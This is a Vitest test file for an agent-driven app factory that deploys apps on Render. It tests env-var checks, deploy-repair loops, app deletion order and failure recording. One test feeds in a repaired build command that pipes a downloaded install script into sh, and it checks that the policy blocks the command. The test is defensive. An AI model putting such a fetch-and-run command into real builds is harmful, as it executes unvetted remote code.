/**
 * The pipelines in app/workflow.ts. No test calls a live service: the agents,
 * the store, Git commit and push, the Render reads, and the Render deletes are
 * fakes.
 */
import { type TaskContext, TaskRegistry } from "@renderinc/sdk/workflows";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { parse } from "yaml";
import { appPath, factoryConfig } from "../factory.config.js";
import { rootBlueprint } from "../app/blueprint.js";
import type { AppSpec, Manifest, Service } from "../app/contracts.js";
import type { DeployOutcome, DeployRecord, RenderMcp } from "../app/render.js";
import type { ExecResult, Sandbox } from "../app/sandbox.js";
import {
	awaitDeployment,
	checkStaticSiteEnvVars,
	deleteApp,
	promptToApp,
	removeApp,
} from "../app/workflow.js";

const mocks = vi.hoisted(() => ({
	architectTask: vi.fn(),
	buildTask: vi.fn(),
	deployManagerTask: vi.fn(),
	commitAll: vi.fn(),
	pushVerified: vi.fn(),
	githubToken: vi.fn(),
	cloneAppsRepo: vi.fn(),
	createSandbox: vi.fn(),
	findBlueprint: vi.fn(),
	pageContains: vi.fn(),
	waitForServices: vi.fn(),
	waitForDeploy: vi.fn(),
	waitForHttpOk: vi.fn(),
	deleteAppResources: vi.fn(),
	claimRunApp: vi.fn(async () => true),
	deleteRuns: vi.fn(async () => {}),
	failDelete: vi.fn(async () => {}),
	finishRun: vi.fn(async () => {}),
}));

vi.mock("../app/agents.js", () => ({
	architectTask: { name: "architect", func: mocks.architectTask },
	curatorTask: { name: "curator", func: vi.fn() },
	buildTask: { name: "builder", func: mocks.buildTask },
	deployManagerTask: { name: "deploy-manager", func: mocks.deployManagerTask },
}));

/** Runs each subtask in this process, with the body of its task definition. */
const tasks: TaskContext = {
	run: async (task, ...args) => task.func(tasks, ...args),
};

vi.mock("../app/store.js", () => ({
	claimRunApp: mocks.claimRunApp,
	deleteRuns: mocks.deleteRuns,
	failDelete: mocks.failDelete,
	finishRun: mocks.finishRun,
	setDeleteProgress: vi.fn(async () => {}),
	setRunApp: vi.fn(async () => {}),
	setRunStage: vi.fn(async () => {}),
	setRunUrls: vi.fn(async () => {}),
	touchRun: vi.fn(async () => {}),
}));

// Commit and push go to GitHub. The verification commands stay real and go
// to the fake sandbox.
vi.mock("../app/git.js", async (importOriginal) => ({
	...(await importOriginal<typeof import("../app/git.js")>()),
	commitAll: mocks.commitAll,
	pushVerified: mocks.pushVerified,
	githubToken: mocks.githubToken,
	cloneAppsRepo: mocks.cloneAppsRepo,
}));

vi.mock("../app/sandbox.js", async (importOriginal) => ({
	...(await importOriginal<typeof import("../app/sandbox.js")>()),
	createSandbox: mocks.createSandbox,
}));

vi.mock("../app/teardown.js", () => ({
	deleteAppResources: mocks.deleteAppResources,
}));

vi.mock("../app/render.js", async (importOriginal) => ({
	...(await importOriginal<typeof import("../app/render.js")>()),
	findBlueprint: mocks.findBlueprint,
	pageContains: mocks.pageContains,
	waitForServices: mocks.waitForServices,
	waitForDeploy: mocks.waitForDeploy,
	waitForHttpOk: mocks.waitForHttpOk,
}));

const PRIVATE_NETWORK_PROPERTIES = ["host", "port", "hostport"];

const storefront: Service = {
	name: "storefront",
	kind: "static_site",
	rootDir: "web",
	runtime: "static",
	buildCommand: "npm ci && npm run build",
	staticPublishPath: "dist",
};

const api: Service = {
	name: "api",
	kind: "web_service",
	rootDir: "api",
	runtime: "node",
	buildCommand: "npm ci && npm run build",
	startCommand: "npm start",
};

/**
 * A browser uses the env vars of a static site, and a static site is not on
 * Render's private network. Verification must find a private-network value
 * before the push. After the push, the Blueprint creates every resource.
 */
describe("checkStaticSiteEnvVars", () => {
	it.each(PRIVATE_NETWORK_PROPERTIES)(
		"rejects fromService property %s on a static site",
		(property) => {
			const failures = checkStaticSiteEnvVars({
				...storefront,
				envVars: [
					{ key: "VITE_API_HOST", fromService: { name: "api", property } },
				],
			});

			expect(failures).toHaveLength(1);
			expect(failures[0]).toMatch(/^storefront: envVar VITE_API_HOST /);
			expect(failures[0]).toContain(
				"A browser cannot connect to a private-network name.",
			);
			expect(failures[0]).toContain(
				`Replace property ${property} with envVarKey RENDER_EXTERNAL_HOSTNAME`,
			);
		},
	);

	it("accepts the public hostname of the API on a static site", () => {
		expect(
			checkStaticSiteEnvVars({
				...storefront,
				envVars: [
					{
						key: "VITE_API_HOST",
						fromService: { name: "api", envVarKey: "RENDER_EXTERNAL_HOSTNAME" },
					},
				],
			}),
		).toEqual([]);
	});

	// Services connect to each other on the private network.
	it.each(PRIVATE_NETWORK_PROPERTIES)(
		"accepts fromService property %s on a web service",
		(property) => {
			expect(
				checkStaticSiteEnvVars({
					...api,
					envVars: [
						{ key: "SEARCH_HOST", fromService: { name: "search", property } },
					],
				}),
			).toEqual([]);
		},
	);
});

const APP_DIR = appPath("demo", "shop");
const APP_SPEC = `${APP_DIR}/factory.json`;
const APP_BLUEPRINT = `${APP_DIR}/render.yaml`;
const ROOT_BLUEPRINT = `${factoryConfig.repoDir}/${factoryConfig.blueprintPath}`;
const API_URL = "https://acme-demo-shop-api.onrender.com";

const STOREFRONT_HTML = `<!doctype html><html><body>${"<p>Walnut chairs, oak tables, and ash stools, made by hand in Portland.</p>".repeat(5)}</body></html>`;

const LIVE: DeployOutcome = {
	deployId: "dep-2",
	status: "live",
	result: "live",
};
const FAILED: DeployOutcome = {
	deployId: "dep-1",
	status: "pre_deploy_failed",
	result: "failed",
};

const manifest: Manifest = {
	services: [
		{
			name: "web",
			kind: "static_site",
			rootDir: "web",
			runtime: "static",
			buildCommand: "npm ci && npm run build",
			staticPublishPath: "dist",
			envVars: [
				{
					key: "VITE_API_HOST",
					fromService: { name: "api", envVarKey: "RENDER_EXTERNAL_HOSTNAME" },
				},
			],
		},
		{
			name: "api",
			kind: "web_service",
			rootDir: "api",
			runtime: "node",
			buildCommand: "npm ci && npm run build",
			startCommand: "npm start",
			preDeployCommand: "npm run migrate",
			healthCheckPath: "/health",
			dataCheckPath: "/api/items",
			envVars: [
				{ key: "DATABASE_URL", fromDatabase: { property: "connectionString" } },
			],
		},
	],
	databases: [{ name: "db" }],
};

const spec: AppSpec = {
	user: "demo",
	appName: "shop",
	prompt: "Sell handmade walnut furniture online",
	summary: "A storefront, an API, and Postgres behind it.",
	createdAt: "2026-01-01T00:00:00.000Z",
	// Not the default prefix. If a repair makes a new spec instead of a copy,
	// every resource name changes and these tests fail.
	resourcePrefix: "acme",
	tiers: ["static_site", "web_service", "postgres"],
	manifest,
	notes: [],
};

/** A repair that changes only how the API deploys: no source file changes. */
const repair = withApi({
	preDeployCommand: "npm run db:migrate",
	dataCheckPath: "/api/products",
});

function withApi(changes: Partial<Service>): Manifest {
	return {
		...manifest,
		services: manifest.services.map((service) =>
			service.name === "api" ? { ...service, ...changes } : service,
		),
	};
}

function builderReturns(repaired: Manifest): void {
	mocks.buildTask.mockResolvedValue(
		JSON.stringify({ summary: "Fixed the migration.", manifest: repaired }),
	);
}

/** The API service in a Blueprint, after a YAML parse. */
function apiBlock(blueprint: string | undefined) {
	const services = parse(blueprint ?? "").projects[0].environments[0].services;
	return services.find(
		(service: { name: string }) => service.name === "acme-demo-shop-api",
	);
}

/**
 * A sandbox with an in-memory file system. It answers the commands of
 * verify(), of the root Blueprint regeneration, and of removeApp(). Other
 * commands succeed.
 */
function fakeSandbox(files: Map<string, string>) {
	const run = vi.fn(async (command: string): Promise<ExecResult> => {
		const cat = command.match(/^cat '([^']+)'$/);
		if (cat) {
			const contents =
				files.get(cat[1]) ??
				(cat[1].endsWith("/index.html") ? STOREFRONT_HTML : undefined);
			return contents === undefined
				? { output: "", exitCode: 1 }
				: { output: contents, exitCode: 0 };
		}
		const exists = command.match(/^test -e '([^']+)'$/);
		if (exists) {
			return { output: "", exitCode: files.has(exists[1]) ? 0 : 1 };
		}
		const remove = command.match(/^rm -rf '([^']+)'$/);
		if (remove) {
			for (const path of [...files.keys()]) {
				if (path.startsWith(`${remove[1]}/`)) files.delete(path);
			}
			return { output: "", exitCode: 0 };
		}
		if (command.startsWith("find ")) {
			const specs = [...files.keys()].filter((path) =>
				path.endsWith("/factory.json"),
			);
			return { output: specs.join("\n"), exitCode: 0 };
		}
		if (command.startsWith("ls -A ")) {
			return { output: "api\nweb\n", exitCode: 0 };
		}
		return { output: "", exitCode: 0 };
	});

	const sandbox = {
		id: "sbx-test",
		run,
		async mustRun(command: string, label: string): Promise<string> {
			const result = await run(command);
			if (result.exitCode !== 0) throw new Error(`${label} failed`);
			return result.output;
		},
		async readFile(path: string): Promise<string> {
			const result = await run(`cat '${path}'`);
			if (result.exitCode !== 0) throw new Error(`Read ${path} failed`);
			return result.output;
		},
		writeFile: vi.fn(async (path: string, contents: string) => {
			files.set(path, contents);
		}),
		terminate: vi.fn(async () => {}),
	} as unknown as Sandbox;

	return { sandbox, run };
}

let files: Map<string, string>;
let fake: ReturnType<typeof fakeSandbox>;
/** The checkout at each commit, which is what the push sends to Render. */
let commits: Map<string, string>[];

function deploy(mcp = {} as RenderMcp) {
	return awaitDeployment({
		tasks,
		mcp,
		sandbox: fake.sandbox,
		token: "token",
		remoteUrl: "https://github.com/acme/apps.git",
		workspaceId: "tea-test",
		repoUrl: "https://github.com/acme/apps",
		spec,
		appDir: APP_DIR,
		runId: "run-1",
		summary: "Handmade walnut furniture, sold online.",
		databaseUrl: null,
	});
}

/**
 * The deploy-repair loop. Render deploys from the root Blueprint, and the root
 * Blueprint comes from the factory.json of each app. A repair once passed
 * verification with a new manifest, but the commit kept the old factory.json.
 * Render then used the old commands, and the smoke checks used the old paths.
 */
describe("awaitDeployment repairs", () => {
	beforeEach(() => {
		vi.clearAllMocks();

		// What run() published before the first deploy.
		files = new Map([[APP_SPEC, `${JSON.stringify(spec, null, 2)}\n`]]);
		fake = fakeSandbox(files);
		commits = [];

		mocks.findBlueprint.mockResolvedValue({
			id: "exs-test",
			name: "factory",
			status: "synced",
			autoSync: true,
			repo: "https://github.com/acme/apps",
			branch: "main",
			path: "render.yaml",
		});
		mocks.waitForServices.mockImplementation(
			async (_mcp: RenderMcp, _workspaceId: string, names: string[]) =>
				new Map(
					names.map((name) => [
						name,
						{ id: `srv-${name}`, name, url: `https://${name}.onrender.com` },
					]),
				),
		);

		// The API fails its first deploy. After that, every deploy is live.
		const apiDeploys = [FAILED];
		mocks.waitForDeploy.mockImplementation(
			async (_mcp: RenderMcp, serviceId: string) =>
				serviceId === "srv-acme-demo-shop-api"
					? (apiDeploys.shift() ?? LIVE)
					: LIVE,
		);
		mocks.deployManagerTask.mockResolvedValue(
			JSON.stringify({
				allHealthy: false,
				failures: [
					{
						serviceName: "acme-demo-shop-api",
						status: "pre_deploy_failed",
						diagnosis: 'npm error Missing script: "migrate"',
					},
				],
			}),
		);
		mocks.waitForHttpOk.mockResolvedValue({
			ok: true,
			status: 200,
			body: '[{"id":1}]',
			headers: new Headers({ "access-control-allow-origin": "*" }),
		});
		mocks.pageContains.mockResolvedValue(true);

		mocks.commitAll.mockImplementation(async () => {
			commits.push(new Map(files));
			return "b".repeat(40);
		});
		mocks.pushVerified.mockResolvedValue("b".repeat(40));
	});

	it("commits the repaired manifest in factory.json and both Blueprints", async () => {
		builderReturns(repair);

		const result = await deploy();

		expect(result.status, result.summary).toBe("deployed");
		expect(commits).toHaveLength(1);
		const [commit] = commits;
		expect(JSON.parse(commit.get(APP_SPEC) ?? "")).toEqual({
			...spec,
			manifest: repair,
		});
		for (const blueprint of [APP_BLUEPRINT, ROOT_BLUEPRINT]) {
			expect(apiBlock(commit.get(blueprint))).toMatchObject({
				preDeployCommand: "npm run db:migrate",
			});
		}
	});

	it("smoke-tests the paths of the repaired manifest", async () => {
		builderReturns(repair);

		await deploy();

		const urls = mocks.waitForHttpOk.mock.calls.map(([url]) => url);
		expect(urls).toContain(`${API_URL}/api/products`);
		expect(urls).not.toContain(`${API_URL}/api/items`);
	});

	// A concurrent push makes the rebase regenerate the root Blueprint from
	// each factory.json, so the rewritten one must be what it reads.
	it("keeps the repair when a rebase regenerates the root Blueprint", async () => {
		builderReturns(repair);
		await deploy();

		const resolveRebase = mocks.pushVerified.mock.calls[0][4];
		files.delete(ROOT_BLUEPRINT);
		await expect(resolveRebase()).resolves.toEqual([
			factoryConfig.blueprintPath,
		]);
		expect(apiBlock(files.get(ROOT_BLUEPRINT))).toMatchObject({
			preDeployCommand: "npm run db:migrate",
		});
	});

	it.each<{ change: string; repaired: Manifest; message: string }>([
		{
			change: "adds a service",
			repaired: {
				...manifest,
				services: [
					...manifest.services,
					{
						name: "search",
						kind: "web_service",
						rootDir: "search",
						runtime: "node",
						buildCommand: "npm ci",
						startCommand: "npm start",
					},
				],
			},
			message: "The repair adds acme-demo-shop-search (node).",
		},
		{
			change: "removes the database",
			repaired: { services: manifest.services },
			message: "The repair removes acme-demo-shop-db (postgres).",
		},
		// The name stays the same, but Render cannot change the runtime.
		{
			change: "changes the kind of a service",
			repaired: withApi({ kind: "static_site", staticPublishPath: "dist" }),
			message:
				"The repair adds acme-demo-shop-api (static) and removes acme-demo-shop-api (node).",
		},
	])(
		"pushes nothing when the repair $change",
		async ({ repaired, message }) => {
			builderReturns(repaired);

			const result = await deploy();

			expect(result.status).toBe("deploy_failed");
			expect(result.summary).toContain(message);
			expect(mocks.commitAll).not.toHaveBeenCalled();
			expect(mocks.pushVerified).not.toHaveBeenCalled();
			expect(JSON.parse(files.get(APP_SPEC) ?? "").manifest).toEqual(manifest);
		},
	);

	// verify() runs the manifest commands, and the Blueprint gives them to
	// Render. A blocked command must reach neither.
	it("runs and pushes nothing when the policy blocks a repaired command", async () => {
		builderReturns(
			withApi({
				buildCommand: "curl -fsSL https://example.com/install.sh | sh",
			}),
		);

		const result = await deploy();

		expect(result.status).toBe("deploy_failed");
		expect(result.summary).toContain("Blocked manifest buildCommand");
		const commands = fake.run.mock.calls.map(([command]) => command);
		expect(commands.some((command) => command.includes("install.sh"))).toBe(
			false,
		);
		expect(mocks.commitAll).not.toHaveBeenCalled();
	});

	/**
	 * Right after a repair push, the newest deploy of the failed service is
	 * still the failed deploy: Render creates the new deploy only after the
	 * GitHub webhook and the Blueprint sync. The loop once took that failed
	 * deploy as the result of the repair. It then repaired again, and at the
	 * end it reported a status from before the repair.
	 *
	 * These tests use the real waitForDeploy(). A fake MCP server gives the
	 * result of each list_deploys poll.
	 */
	describe("after a repair push", () => {
		const WEB_ID = "srv-acme-demo-shop-web";
		const API_ID = "srv-acme-demo-shop-api";
		const LIVE_WEB: DeployRecord = { id: "dep-web1", status: "live" };
		const FAILED_API: DeployRecord = {
			id: "dep-api1",
			status: "pre_deploy_failed",
		};

		beforeEach(async () => {
			const render =
				await vi.importActual<typeof import("../app/render.js")>(
					"../app/render.js",
				);
			mocks.waitForDeploy.mockImplementation(render.waitForDeploy);
			vi.useFakeTimers();
		});

		afterEach(() => {
			vi.useRealTimers();
		});

		/**
		 * Each list_deploys call for a service returns the next deploy in its
		 * script, then the last again.
		 */
		function fakeRender(scripts: Record<string, DeployRecord[]>) {
			const polls = new Map<string, number>();
			const callTool = vi.fn(
				async (tool: string, args: Record<string, unknown>) => {
					const serviceId = String(args.serviceId);
					const script = scripts[serviceId];
					if (tool !== "list_deploys" || !script) {
						throw new Error(`Unexpected ${tool} call for ${serviceId}`);
					}
					const poll = polls.get(serviceId) ?? 0;
					polls.set(serviceId, poll + 1);
					return [script[Math.min(poll, script.length - 1)]];
				},
			);
			return { mcp: { callTool } as unknown as RenderMcp, polls };
		}

		/** Deploy, and run the sleeps between the polls at once. */
		async function deployOn(mcp: RenderMcp) {
			const [result] = await Promise.all([deploy(mcp), vi.runAllTimersAsync()]);
			return result;
		}

		/** The deploy status that the deploy manager got in each round. */
		function diagnosedStatuses(): string[] {
			return mocks.deployManagerTask.mock.calls.map(
				([, input]) => input.message.match(/deploy status "([^"]+)"/)?.[1],
			);
		}

		it("waits past the failed deploy that is still the newest", async () => {
			builderReturns(repair);
			const render = fakeRender({
				[WEB_ID]: [LIVE_WEB],
				[API_ID]: [
					FAILED_API,
					// The first poll after the push. Render has not created the
					// deploy of the repair yet.
					FAILED_API,
					{ id: "dep-api2", status: "build_in_progress" },
					{ id: "dep-api2", status: "live" },
				],
			});

			const result = await deployOn(render.mcp);

			expect(result.status, result.summary).toBe("deployed");
			expect(mocks.buildTask).toHaveBeenCalledTimes(1);
			expect(mocks.pushVerified).toHaveBeenCalledTimes(1);
			expect(render.polls.get(API_ID)).toBe(4);
			// The storefront was live, and the repair did not change it.
			expect(render.polls.get(WEB_ID)).toBe(1);
		});

		it("reports the status of the deploy of the last repair", async () => {
			builderReturns(repair);
			const render = fakeRender({
				[WEB_ID]: [LIVE_WEB],
				[API_ID]: [
					FAILED_API,
					FAILED_API,
					{ id: "dep-api2", status: "build_failed" },
					{ id: "dep-api2", status: "build_failed" },
					{ id: "dep-api3", status: "update_failed" },
				],
			});

			const result = await deployOn(render.mcp);

			expect(result).toEqual({
				status: "deploy_failed",
				summary: 'acme-demo-shop-api ended as "update_failed".',
			});
			expect(mocks.pushVerified).toHaveBeenCalledTimes(2);
			expect(diagnosedStatuses()).toEqual([
				"pre_deploy_failed",
				"build_failed",
			]);
		});

		it("reports a repair push that started no new deploy", async () => {
			builderReturns(repair);
			const render = fakeRender({
				[WEB_ID]: [LIVE_WEB],
				[API_ID]: [FAILED_API],
			});

			const result = await deployOn(render.mcp);

			expect(result).toEqual({
				status: "deploy_failed",
				summary:
					"acme-demo-shop-api: the repair push did not start a new deploy in 15 minutes. " +
					'The newest deploy is still dep-api1 ("pre_deploy_failed"). ' +
					"Render deploys a service again when a commit changes files in its rootDir or its entry in the Blueprint.",
			});
			// Another round diagnoses the same failed deploy, so none starts.
			expect(mocks.deployManagerTask).toHaveBeenCalledTimes(1);
			expect(mocks.buildTask).toHaveBeenCalledTimes(1);
			expect(mocks.waitForHttpOk).not.toHaveBeenCalled();
		});

		// Render keeps the last live deploy of a failed service. The smoke
		// checks must not test that deploy as if it were the repair.
		it("fails when the repair changes no files", async () => {
			builderReturns(manifest);
			mocks.commitAll.mockResolvedValue(null);
			const render = fakeRender({
				[WEB_ID]: [LIVE_WEB],
				[API_ID]: [FAILED_API],
			});

			const result = await deployOn(render.mcp);

			expect(result).toEqual({
				status: "deploy_failed",
				summary:
					"Deploy repair round 1 changed no files, so Render has no new commit to deploy. " +
					'acme-demo-shop-api ended as "pre_deploy_failed".',
			});
			expect(mocks.pushVerified).not.toHaveBeenCalled();
			expect(mocks.waitForHttpOk).not.toHaveBeenCalled();
		});
	});
});

/* ── Delete ───────────────────────────────────────────────────────────── */

const APP_SOURCE = `${APP_DIR}/web/index.html`;
const cafe: AppSpec = { ...spec, appName: "cafe", prompt: "A menu for a cafe" };
const CAFE_SPEC = `${appPath("demo", "cafe")}/factory.json`;
const SHOP_RESOURCES = [
	"acme-demo-shop-web",
	"acme-demo-shop-api",
	"acme-demo-shop-db",
];

function json(value: unknown): string {
	return `${JSON.stringify(value, null, 2)}\n`;
}

function sameFiles(a: Map<string, string>, b: Map<string, string>): boolean {
	return (
		a.size === b.size &&
		[...a].every(([path, contents]) => b.get(path) === contents)
	);
}

function remove() {
	return removeApp({
		sandbox: fake.sandbox,
		token: "token",
		remoteUrl: "https://github.com/acme/apps.git",
		repoUrl: "https://github.com/acme/apps",
		workspaceId: "tea-test",
		user: "demo",
		appName: "shop",
		onProgress: async () => {},
	});
}

/**
 * A Blueprint sync recreates a declared resource that is missing, and it
 * never deletes a resource. So the order is the contract: the app leaves the
 * Blueprint, then Render deletes its resources, then its files go.
 */
describe("removeApp", () => {
	/** Each commit, push, and Render delete, in order. */
	let steps: string[];
	/** The files of the last commit. */
	let head: Map<string, string>;

	/** The apps repository as the sandbox clones it. */
	function clone(entries: [string, string][]): void {
		files = new Map(entries);
		fake = fakeSandbox(files);
		head = new Map(files);
	}

	beforeEach(() => {
		vi.clearAllMocks();
		steps = [];
		commits = [];
		clone([
			[APP_SPEC, json(spec)],
			[APP_SOURCE, STOREFRONT_HTML],
			[CAFE_SPEC, json(cafe)],
		]);

		// As git does, make no commit when nothing changed.
		mocks.commitAll.mockImplementation(async () => {
			if (sameFiles(files, head)) return null;
			head = new Map(files);
			commits.push(head);
			steps.push("commit");
			return "c".repeat(40);
		});
		mocks.pushVerified.mockImplementation(async () => {
			steps.push("push");
			return "c".repeat(40);
		});
		mocks.findBlueprint.mockResolvedValue({
			id: "exs-test",
			name: "factory",
			status: "in_sync",
			autoSync: true,
			repo: "https://github.com/acme/apps",
			branch: "main",
			path: "render.yaml",
		});
		mocks.deleteAppResources.mockImplementation(async () => {
			steps.push("delete resources");
			return SHOP_RESOURCES;
		});
	});

	it("deletes the resources after the app leaves the Blueprint, and the files last", async () => {
		await expect(remove()).resolves.toEqual(SHOP_RESOURCES);

		expect(steps).toEqual([
			"commit",
			"push",
			"delete resources",
			"commit",
			"push",
		]);
		const [leave, removal] = commits;

		// A commit that removed the source would start a build of each service.
		expect(leave.get(APP_SOURCE)).toBe(STOREFRONT_HTML);
		expect(JSON.parse(leave.get(APP_SPEC) ?? "")).toEqual({
			...spec,
			deletedAt: expect.any(String),
		});
		const root = leave.get(ROOT_BLUEPRINT) ?? "";
		expect(root).not.toContain("acme-demo-shop");
		expect(root).toContain("acme-demo-cafe-web");

		expect(
			[...removal.keys()].filter((path) => path.startsWith(`${APP_DIR}/`)),
		).toEqual([]);
		expect(removal.get(CAFE_SPEC)).toBe(json(cafe));
	});

	it("gives the teardown the app's spec and the Blueprint to wait for", async () => {
		await remove();

		expect(mocks.findBlueprint).toHaveBeenCalledWith(
			expect.objectContaining({
				workspaceId: "tea-test",
				repo: "https://github.com/acme/apps",
			}),
		);
		expect(mocks.deleteAppResources).toHaveBeenCalledWith(
			expect.objectContaining({
				appName: "shop",
				resourcePrefix: "acme",
				deletedAt: expect.any(String),
			}),
			expect.objectContaining({
				workspaceId: "tea-test",
				blueprintId: "exs-test",
			}),
		);
	});

	// A delete that failed after its first push starts again from there.
	it("continues a delete that an earlier attempt started", async () => {
		const deletedAt = "2026-02-01T00:00:00.000Z";
		clone([
			[APP_SPEC, json({ ...spec, deletedAt })],
			[APP_SOURCE, STOREFRONT_HTML],
			[CAFE_SPEC, json(cafe)],
			[ROOT_BLUEPRINT, rootBlueprint([cafe])],
		]);

		await remove();

		expect(steps).toEqual(["delete resources", "commit", "push"]);
		expect(mocks.deleteAppResources).toHaveBeenCalledWith(
			expect.objectContaining({ deletedAt }),
			expect.anything(),
		);
	});

	it("deletes nothing on Render for an app that has no spec", async () => {
		clone([[CAFE_SPEC, json(cafe)]]);

		await expect(remove()).resolves.toEqual([]);

		expect(mocks.findBlueprint).not.toHaveBeenCalled();
		expect(mocks.deleteAppResources).not.toHaveBeenCalled();
		expect(steps).toEqual([]);
	});

	it("keeps the files and the spec when Render does not delete a resource", async () => {
		mocks.deleteAppResources.mockRejectedValue(
			new Error("Render did not delete acme-demo-shop-api (403)"),
		);

		await expect(remove()).rejects.toThrow("(403)");

		expect(steps).toEqual(["commit", "push"]);
		expect(files.get(APP_SOURCE)).toBe(STOREFRONT_HTML);
		expect(JSON.parse(files.get(APP_SPEC) ?? "").deletedAt).toEqual(
			expect.any(String),
		);
	});

	// The resource names come from the spec, so a wrong spec would delete the
	// resources of a different app.
	it("changes nothing when factory.json is the spec of a different app", async () => {
		clone([
			[APP_SPEC, json(cafe)],
			[APP_SOURCE, STOREFRONT_HTML],
		]);

		await expect(remove()).rejects.toThrow("is not a valid spec of demo/shop");

		expect(steps).toEqual([]);
		expect(files.get(APP_SOURCE)).toBe(STOREFRONT_HTML);
	});

	it("deletes an app that has only the legacy spec", async () => {
		clone([
			[`${APP_DIR}/airo.json`, json({ ...spec, resourcePrefix: undefined })],
			[APP_SOURCE, STOREFRONT_HTML],
			[CAFE_SPEC, json(cafe)],
		]);

		await remove();

		const [target] = mocks.deleteAppResources.mock.calls[0];
		expect(target).toMatchObject({ appName: "shop" });
		expect(target.resourcePrefix).toBeUndefined();
		expect(
			[...files.keys()].filter((path) => path.startsWith(APP_DIR)),
		).toEqual([]);
	});
});

describe("deleteApp", () => {
	beforeEach(() => {
		vi.clearAllMocks();
		process.env.APPS_REPO = "acme/apps";
		process.env.RENDER_WORKSPACE_ID = "tea-test";
		files = new Map([
			[APP_SPEC, json(spec)],
			[APP_SOURCE, STOREFRONT_HTML],
		]);
		fake = fakeSandbox(files);
		mocks.createSandbox.mockResolvedValue(fake.sandbox);
		mocks.githubToken.mockResolvedValue("token");
		mocks.cloneAppsRepo.mockResolvedValue("https://github.com/acme/apps.git");
		mocks.commitAll.mockResolvedValue("c".repeat(40));
		mocks.pushVerified.mockResolvedValue("c".repeat(40));
		mocks.findBlueprint.mockResolvedValue(null);
		mocks.deleteAppResources.mockResolvedValue([]);
	});

	it("deletes the runs of the app after the app is gone", async () => {
		await expect(
			deleteApp.func(tasks, { user: "demo", appName: "shop" }),
		).resolves.toMatchObject({ status: "deleted" });

		expect(mocks.deleteRuns).toHaveBeenCalledWith("demo", "shop");
		expect(mocks.failDelete).not.toHaveBeenCalled();
		expect(fake.sandbox.terminate).toHaveBeenCalled();
	});

	it("keeps the runs, marked delete_failed, when the delete fails", async () => {
		mocks.deleteAppResources.mockRejectedValue(
			new Error("Render did not delete acme-demo-shop-db (403)"),
		);

		await expect(
			deleteApp.func(tasks, { user: "demo", appName: "shop" }),
		).rejects.toThrow("(403)");

		expect(mocks.failDelete).toHaveBeenCalledWith(
			"demo",
			"shop",
			"Render did not delete acme-demo-shop-db (403)",
		);
		expect(mocks.deleteRuns).not.toHaveBeenCalled();
		expect(fake.sandbox.terminate).toHaveBeenCalled();
	});

	it("starts no sandbox for an app name that is not a slug", async () => {
		await expect(
			deleteApp.func(tasks, { user: "demo", appName: "../shop" }),
		).rejects.toThrow();
		expect(mocks.createSandbox).not.toHaveBeenCalled();
	});
});

describe("promptToApp", () => {
	beforeEach(() => {
		vi.clearAllMocks();
		process.env.APPS_REPO = "acme/apps";
		process.env.RENDER_WORKSPACE_ID = "tea-test";
		process.env.RENDER_API_KEY = "rnd_test";
		mocks.architectTask.mockResolvedValue(
			JSON.stringify({
				appName: "shop",
				summary: "A storefront for handmade walnut furniture.",
				tiers: [
					{ kind: "static_site", reason: "The catalog does not change." },
				],
				assetQueries: [],
				brief: {
					pages: ["Home"],
					features: [],
					voice: "Warm and plain",
					content: "Walnut chairs, oak tables, and ash stools.",
				},
			}),
		);
	});

	// The delete would remove what the run publishes.
	it("builds nothing when a delete of the app is in progress", async () => {
		mocks.claimRunApp.mockResolvedValueOnce(false);

		const result = await promptToApp.func(tasks, {
			prompt: "Sell handmade walnut furniture online",
			user: "demo",
			runId: "run-1",
		});

		expect(result).toEqual({
			status: "failed",
			summary: expect.stringContaining("demo/shop is being deleted"),
		});
		expect(mocks.claimRunApp).toHaveBeenCalledWith("run-1", "demo", {
			appName: "shop",
			blueprintPath: "apps/demo/shop/render.yaml",
		});
		expect(mocks.createSandbox).not.toHaveBeenCalled();
		expect(mocks.finishRun).toHaveBeenCalledWith("run-1", "failed", {
			summary: expect.stringContaining("being deleted"),
		});
	});

	// A failed run is final. The task sets its runs row to "failed" and throws,
	// and Render then records a failed task run. A retry by Render starts the
	// pipeline again outside the concurrency limit, and its result can replace
	// the terminal status that the UI and the demo already showed.
	it("records a failure once, and Render does not run the task again", async () => {
		const reason = 'Subtask failed: Agent "architect" failed: error_max_turns';
		mocks.architectTask.mockRejectedValue(new Error(reason));

		await expect(
			promptToApp.func(tasks, {
				prompt: "Sell handmade walnut furniture online",
				user: "demo",
				runId: "run-1",
			}),
		).rejects.toThrow(reason);

		expect(mocks.finishRun).toHaveBeenCalledTimes(1);
		expect(mocks.finishRun).toHaveBeenCalledWith("run-1", "failed", {
			summary: reason,
		});
		// The options that the host sends to Render when it registers tasks.
		expect(
			TaskRegistry.getInstance().get(promptToApp.name)?.options?.retry,
		).toEqual({ max_retries: 0, wait_duration_ms: 0 });
	});
});
